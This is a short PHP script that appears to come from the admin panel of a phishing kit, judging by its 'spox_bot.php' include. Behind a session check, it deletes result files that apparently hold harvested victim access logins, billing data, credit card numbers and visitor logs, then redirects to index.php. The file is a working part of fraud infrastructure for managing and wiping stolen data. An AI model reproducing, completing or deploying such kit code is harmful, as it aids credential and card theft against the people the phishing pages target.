<?php
error_reporting(0);
session_start();
include'../spox_bot.php';
if (!isset($_SESSION['admino'])) {
  header("location: ../admin/");
}
if(!isset($_SESSION['login'])) {
    header("location: login.php");
}
if (isset($_GET['dellet'])) {
unlink("result/access".$resultpin.".txt");
unlink("result/billings".$resultpin.".txt");
unlink("result/bulkbillings".$resultpin.".txt");
unlink("result/bulkaccess".$resultpin.".txt");
unlink("result/cc".$resultpin.".txt");
unlink("result/bulkcc".$resultpin.".txt");
unlink("result/bulklogs".$resultpin.".txt");
unlink("result/logs".$resultpin.".txt");
unlink("result/visitor.txt");
unlink("result/blocked.txt");
echo "<script type='text/javascript'>window.top.location='index.php';</script>";
}else{
  echo "<script type='text/javascript'>window.top.location='index.php';</script>";
}
?>